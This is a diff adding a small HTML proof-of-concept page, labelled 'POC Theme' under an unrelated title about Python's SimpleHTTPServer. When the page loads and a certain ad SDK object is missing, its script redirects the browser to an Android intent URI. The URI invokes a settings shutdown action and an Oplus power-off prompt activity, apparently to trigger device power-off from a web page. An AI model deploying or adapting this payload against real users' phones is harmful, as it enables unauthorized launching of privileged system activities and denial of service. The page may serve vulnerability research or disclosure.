@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Using Python's SimpleHTTPServer Module</title>
+</head>
+<body>
+  <h1>POC Theme</h1>
+<br/>
+<br/>
+<div id="info"></div></h1>
+<script>
+        /**
+         * 当整个页面（包括所有依赖资源如样式表和图片）
+         * 完全加载完成后，此函数将被执行。
+         */
+        window.onload = function() {
+          
+            if (typeof sdk !== 'undefined' && typeof sdk.adSdk === 'function') {
+                
+                //
+
+            } else {
+
+                location.href = "intent:#Intent;action=com.android.settings.Shutdown;SEL;action=com.android.settings.Shutdown;component=com.android.settings/com.oplus.settings.feature.othersettings.timepower.PowerOffPromptActivity;end";
+            
+            }
+        };
+
+</body>
+</html>
